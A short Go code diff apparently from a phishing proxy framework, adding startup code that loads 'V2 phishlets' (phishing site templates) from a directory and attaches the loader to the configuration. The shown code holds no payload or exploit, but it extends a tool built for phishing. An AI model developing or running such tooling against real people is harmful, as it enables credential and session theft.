@@ -129,6 +129,17 @@ func main() {
 		log.Fatal("config: %v", err)
 		return
 	}
+
+	// Initialize V2 phishlet loader
+	phishletsV2Dir := filepath.Join(exe_dir, "phishlets_v2")
+	v2Loader := core.NewPhishletV2Loader(phishletsV2Dir)
+	if err := v2Loader.LoadAll(); err != nil {
+		log.Warning("failed to load V2 phishlets: %v", err)
+	} else {
+		log.Info("loaded %d V2 phishlets", v2Loader.GetPhishletCount())
+	}
+	cfg.SetV2Loader(v2Loader)
+
 	cfg.SetRedirectorsDir(*redirectors_dir)
 
 	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
